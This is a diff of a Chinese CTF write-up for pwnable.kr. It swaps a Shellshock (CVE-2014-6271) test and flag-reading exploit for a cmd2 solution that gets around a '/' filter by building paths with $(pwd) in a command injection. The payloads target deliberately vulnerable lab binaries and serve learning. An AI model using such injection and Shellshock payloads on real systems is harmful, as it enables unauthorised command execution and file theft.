@@ -21,20 +21,12 @@ category:  	writeup
 
 ### 0x00 exploit
 
-CVE-2014-6271 破壳漏洞利用, 先检验漏洞是否存在
+相比 cmd1, 还过滤了 '/' 字符, 利用 pwd 绕过
 
 ```
-$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
-```
-
-![](/assets/img/writeup/pwn/2017-08-27-pwnable-shellshock/0x00.png)
-
-构造一下利用
-
-```
-$ env x='() { :;}; /bin/cat flag' bash -c "./shellshock"
+$ /home/cmd2/cmd2 '""$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*""'
 ```
 
 getflag~
 
-![](/assets/img/writeup/pwn/2017-08-27-pwnable-shellshock/0x01.png)
+![](/assets/img/writeup/pwn/2017-08-27-pwnable-cmd2/0x00.png)
